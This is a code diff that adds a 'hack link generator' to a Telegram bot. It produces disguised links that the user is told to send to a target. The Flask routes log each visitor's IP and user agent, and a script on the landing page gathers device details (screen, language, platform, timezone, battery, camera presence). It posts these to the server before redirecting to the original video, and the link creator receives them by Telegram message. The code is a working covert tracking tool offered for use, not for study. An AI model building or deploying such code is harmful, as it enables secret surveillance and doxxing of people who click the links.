@@ -1127,3 +1127,457 @@ def set_webhook():
 if __name__ == "__main__":
     set_webhook()
     app.run(host="0.0.0.0", port=PORT, debug=False)
+
+# =============================================================================
+# HACK LINK GENERATOR – /genlink (with DANGER THEME)
+# =============================================================================
+
+# Ensure these tables exist in init_db()
+"""
+CREATE TABLE IF NOT EXISTS links (
+    link_id TEXT PRIMARY KEY,
+    user_id INTEGER,
+    original_url TEXT,
+    modified_url TEXT,
+    created_at TEXT,
+    clicks INTEGER DEFAULT 0
+);
+CREATE TABLE IF NOT EXISTS clicks (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    link_id TEXT,
+    ip TEXT,
+    user_agent TEXT,
+    screen TEXT,
+    language TEXT,
+    platform TEXT,
+    timezone TEXT,
+    battery TEXT,
+    location TEXT,
+    camera TEXT,
+    clipboard TEXT,
+    phone TEXT,
+    timestamp TEXT
+);
+"""
+
+@bot.message_handler(commands=['genlink', 'terminal:gernatLINK'])
+def genlink_command(message):
+    """Start the hack link generator"""
+    ensure_user(message.from_user)
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("💀 ENTER VIDEO LINK", callback_data="genlink_enter"))
+    
+    danger_text = """
+╔══════════════════════════════════╗
+║  💀 *HACK LINK GENERATOR* 💀      ║
+╠══════════════════════════════════╣
+║                                   ║
+║  ⚡ This tool generates a modified ║
+║     link that collects visitor    ║
+║     information silently.         ║
+║                                   ║
+║  ⚠️ USE AT YOUR OWN RISK          ║
+║                                   ║
+╚══════════════════════════════════╝
+👇 Click button and paste your video link
+    """
+    bot.reply_to(message, danger_text, reply_markup=markup, parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda c: c.data == "genlink_enter")
+def genlink_ask_link(call):
+    bot.edit_message_text(
+        "📤 *Send me the video link*\nExample: https://youtube.com/watch?v=...",
+        call.message.chat.id,
+        call.message.message_id,
+        parse_mode="Markdown"
+    )
+    bot.register_next_step_handler(call.message, genlink_process_link)
+
+def genlink_process_link(message):
+    url = message.text.strip()
+    if not (url.startswith('http://') or url.startswith('https://')):
+        bot.reply_to(message, "❌ *Invalid Link!* Must start with http:// or https://", parse_mode="Markdown")
+        return
+
+    # ========== DANGER ANIMATED LOADING ==========
+    wait_msg = bot.reply_to(message, "💀 *INITIALIZING HACK...*", parse_mode="Markdown")
+    
+    # Loading frames with progress bar
+    frames = [
+        "⚡ [          ] 0%",
+        "🔴 [█         ] 10%",
+        "🔴 [██        ] 20%",
+        "🔴 [███       ] 30%",
+        "🔴 [████      ] 40%",
+        "🔴 [█████     ] 50%",
+        "🔴 [██████    ] 60%",
+        "🔴 [███████   ] 70%",
+        "🔴 [████████  ] 80%",
+        "🔴 [█████████ ] 90%",
+        "💀 [██████████] 100%"
+    ]
+    
+    for frame in frames:
+        time.sleep(0.3)
+        try:
+            bot.edit_message_text(f"💀 *GENERATING LINK...*\n{frame}", wait_msg.chat.id, wait_msg.message_id, parse_mode="Markdown")
+        except:
+            pass
+    
+    time.sleep(0.5)
+    
+    # Final "danger" message
+    bot.edit_message_text(
+        "💀 *LINK GENERATED!*\n\n_Injecting tracking code..._",
+        wait_msg.chat.id,
+        wait_msg.message_id,
+        parse_mode="Markdown"
+    )
+    time.sleep(0.8)
+    
+    # Generate unique link
+    link_id = str(uuid.uuid4())[:8]
+    base = os.environ.get("RENDER_URL", "https://your-app.onrender.com")
+    modified_url = f"{base}/click/{link_id}"
+
+    # Save to database
+    conn = get_db()
+    conn.execute(
+        "INSERT INTO links (link_id, user_id, original_url, modified_url, created_at) VALUES (?, ?, ?, ?, ?)",
+        (link_id, message.from_user.id, url, modified_url, datetime.now().isoformat())
+    )
+    conn.commit()
+    conn.close()
+
+    # Success message with buttons
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("📋 COPY LINK", callback_data=f"genlink_copy_{link_id}"),
+        types.InlineKeyboardButton("🔍 TEST LINK", url=modified_url)
+    )
+    
+    success_text = f"""
+╔══════════════════════════════════╗
+║  💀 *HACK LINK READY* 💀          ║
+╠══════════════════════════════════╣
+║                                   ║
+║  🔗 `{modified_url}`              ║
+║                                   ║
+║  📊 This link will collect:       ║
+║  • IP Address                     ║
+║  • Device Info                    ║
+║  • Browser Details                ║
+║  • Screen Resolution              ║
+║  • Language & Timezone            ║
+║  • Battery Level (if allowed)     ║
+║  • Location (if allowed)          ║
+║  • Camera (if allowed)            ║
+║                                   ║
+║  ⚠️ Send this link to target       ║
+║                                   ║
+╚══════════════════════════════════╝
+    """
+    bot.edit_message_text(
+        success_text,
+        wait_msg.chat.id,
+        wait_msg.message_id,
+        parse_mode="Markdown",
+        reply_markup=markup
+    )
+
+@bot.callback_query_handler(func=lambda c: c.data.startswith("genlink_copy_"))
+def genlink_copy_callback(call):
+    link_id = call.data.split("_")[2]
+    conn = get_db()
+    row = conn.execute("SELECT modified_url FROM links WHERE link_id=?", (link_id,)).fetchone()
+    conn.close()
+    if row:
+        bot.answer_callback_query(call.id, "✅ Copied to clipboard!")
+        bot.send_message(call.message.chat.id, f"📋 `{row['modified_url']}`", parse_mode="Markdown")
+    else:
+        bot.answer_callback_query(call.id, "❌ Link not found")
+
+# =============================================================================
+# FLASK ROUTE FOR CLICK TRACKING
+# =============================================================================
+@app.route('/click/<link_id>')
+def click_track(link_id):
+    # Get original URL
+    conn = get_db()
+    row = conn.execute("SELECT original_url FROM links WHERE link_id=?", (link_id,)).fetchone()
+    if not row:
+        conn.close()
+        return "Link not found", 404
+    original = row["original_url"]
+
+    # Collect basic info from request
+    ip = request.remote_addr
+    ua = request.user_agent.string
+
+    # Insert click record (basic)
+    conn.execute(
+        "INSERT INTO clicks (link_id, ip, user_agent, timestamp) VALUES (?, ?, ?, ?)",
+        (link_id, ip, ua, datetime.now().isoformat())
+    )
+    conn.execute("UPDATE links SET clicks = clicks + 1 WHERE link_id=?", (link_id,))
+    conn.commit()
+    conn.close()
+
+    # Notify owner
+    try:
+        bot.send_message(OWNER_ID, f"💀 *New Click!*\nLink: `{link_id}`\nIP: `{ip}`", parse_mode="Markdown")
+    except:
+        pass
+
+    # DANGER THEME HTML PAGE with data collection
+    html = f"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM ACCESS</title>
+    <style>
+        body {{
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            padding: 50px 20px;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }}
+        .container {{
+            max-width: 600px;
+            width: 100%;
+        }}
+        h1 {{
+            font-size: 2.5rem;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 30px;
+            animation: blink 2s infinite;
+        }}
+        @keyframes blink {{
+            0%, 100% {{ opacity: 1; }}
+            50% {{ opacity: 0.5; }}
+        }}
+        .progress-bar {{
+            width: 100%;
+            height: 30px;
+            background: #1a1a1a;
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+            margin: 30px 0;
+            overflow: hidden;
+        }}
+        .progress-fill {{
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #00ff00, #00aa00);
+            animation: progress 3s ease-in-out forwards;
+        }}
+        @keyframes progress {{
+            0% {{ width: 0%; }}
+            100% {{ width: 100%; }}
+        }}
+        .data-row {{
+            text-align: left;
+            background: #1a1a1a;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 0.9rem;
+            opacity: 0;
+            animation: fadeIn 0.5s ease-out forwards;
+        }}
+        .data-row:nth-child(1) {{ animation-delay: 1s; }}
+        .data-row:nth-child(2) {{ animation-delay: 1.5s; }}
+        .data-row:nth-child(3) {{ animation-delay: 2s; }}
+        .data-row:nth-child(4) {{ animation-delay: 2.5s; }}
+        .data-row:nth-child(5) {{ animation-delay: 3s; }}
+        .data-row:nth-child(6) {{ animation-delay: 3.5s; }}
+        .data-row:nth-child(7) {{ animation-delay: 4s; }}
+        .data-row:nth-child(8) {{ animation-delay: 4.5s; }}
+        @keyframes fadeIn {{
+            from {{ opacity: 0; transform: translateY(10px); }}
+            to {{ opacity: 1; transform: translateY(0); }}
+        }}
+        .glitch {{
+            font-size: 1.2rem;
+            color: #ff0000;
+            text-shadow: 0 0 5px #ff0000;
+            animation: glitch 1s infinite;
+        }}
+        @keyframes glitch {{
+            0%, 100% {{ transform: translate(0); }}
+            20% {{ transform: translate(-2px, 2px); }}
+            40% {{ transform: translate(2px, -2px); }}
+            60% {{ transform: translate(-2px, -2px); }}
+            80% {{ transform: translate(2px, 2px); }}
+        }}
+        .terminal {{ text-align: left; margin-top: 30px; }}
+        .terminal-line {{ color: #00ff00; margin: 5px 0; font-size: 0.8rem; }}
+        .blink {{ animation: blink 1s step-end infinite; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ SYSTEM ACCESS ⚡</h1>
+        
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        
+        <div class="glitch">⚠️ COLLECTING DATA... ⚠️</div>
+        
+        <div id="data-container">
+            <div class="data-row">
+                <strong>IP Address:</strong> <span id="ip">{request.remote_addr}</span>
+            </div>
+            <div class="data-row">
+                <strong>User Agent:</strong> <span id="ua">{request.user_agent.string[:100]}</span>
+            </div>
+            <div class="data-row">
+                <strong>Screen Resolution:</strong> <span id="screen">detecting...</span>
+            </div>
+            <div class="data-row">
+                <strong>Language:</strong> <span id="lang">detecting...</span>
+            </div>
+            <div class="data-row">
+                <strong>Platform:</strong> <span id="platform">detecting...</span>
+            </div>
+            <div class="data-row">
+                <strong>Timezone:</strong> <span id="tz">detecting...</span>
+            </div>
+            <div class="data-row">
+                <strong>Battery:</strong> <span id="battery">detecting...</span>
+            </div>
+            <div class="data-row">
+                <strong>Camera:</strong> <span id="camera">checking...</span>
+            </div>
+        </div>
+        
+        <div class="terminal">
+            <div class="terminal-line">> Establishing connection... <span class="blink">_</span></div>
+            <div class="terminal-line">> Fetching device info...</div>
+            <div class="terminal-line">> Geolocating...</div>
+            <div class="terminal-line">> Redirecting in <span id="countdown">3</span> seconds...</div>
+        </div>
+    </div>
+
+    <script>
+        // Collect all data
+        const data = {{
+            screen: screen.width + 'x' + screen.height,
+            language: navigator.language,
+            platform: navigator.platform,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            userAgent: navigator.userAgent
+        }};
+
+        // Update UI
+        document.getElementById('screen').innerText = data.screen;
+        document.getElementById('lang').innerText = data.language;
+        document.getElementById('platform').innerText = data.platform;
+        document.getElementById('tz').innerText = data.timezone;
+
+        // Battery API
+        if (navigator.getBattery) {{
+            navigator.getBattery().then(function(battery) {{
+                let level = Math.round(battery.level * 100);
+                document.getElementById('battery').innerText = level + '%';
+                data.battery = level + '%';
+            }});
+        }} else {{
+            document.getElementById('battery').innerText = 'Not available';
+        }}
+
+        // Camera check
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {{
+            navigator.mediaDevices.enumerateDevices().then(function(devices) {{
+                let hasCamera = devices.some(d => d.kind === 'videoinput');
+                document.getElementById('camera').innerText = hasCamera ? 'Available' : 'None';
+                data.camera = hasCamera ? 'available' : 'none';
+            }}).catch(function() {{
+                document.getElementById('camera').innerText = 'Permission needed';
+            }});
+        }}
+
+        // Send data to server
+        fetch('/collect/{link_id}', {{
+            method: 'POST',
+            headers: {{ 'Content-Type': 'application/json' }},
+            body: JSON.stringify(data)
+        }}).catch(err => console.log(err));
+
+        // Countdown redirect
+        let seconds = 3;
+        const countdownEl = document.getElementById('countdown');
+        const timer = setInterval(() => {{
+            seconds--;
+            countdownEl.innerText = seconds;
+            if (seconds <= 0) {{
+                clearInterval(timer);
+                window.location.href = '{original}';
+            }}
+        }}, 1000);
+    </script>
+</body>
+</html>
+    """
+    return html
+
+@app.route('/collect/<link_id>', methods=['POST'])
+def collect_data(link_id):
+    """Endpoint to receive extra visitor data from JavaScript"""
+    data = request.json
+    
+    conn = get_db()
+    # Update the most recent click for this link with this IP
+    conn.execute("""
+        UPDATE clicks SET 
+            screen = ?, 
+            language = ?, 
+            platform = ?, 
+            timezone = ?,
+            battery = ?,
+            camera = ?
+        WHERE link_id = ? AND ip = ? AND timestamp = (
+            SELECT MAX(timestamp) FROM clicks WHERE link_id = ? AND ip = ?
+        )
+    """, (
+        data.get('screen'), 
+        data.get('language'), 
+        data.get('platform'), 
+        data.get('timezone'),
+        data.get('battery'),
+        data.get('camera'),
+        link_id, 
+        request.remote_addr, 
+        link_id, 
+        request.remote_addr
+    ))
+    conn.commit()
+    
+    # Get owner of this link
+    row = conn.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,)).fetchone()
+    if row:
+        user_id = row["user_id"]
+        # Check if user is premium (to send more data)
+        if is_premium(user_id):
+            msg = f"💀 *Visitor Data*\nLink: `{link_id}`\nIP: `{request.remote_addr}`\n"
+            for key, value in data.items():
+                if value:
+                    msg += f"{key}: `{value}`\n"
+            try:
+                bot.send_message(user_id, msg, parse_mode="Markdown")
+            except:
+                pass
+    
+    conn.close()
+    return jsonify({"status": "ok"})
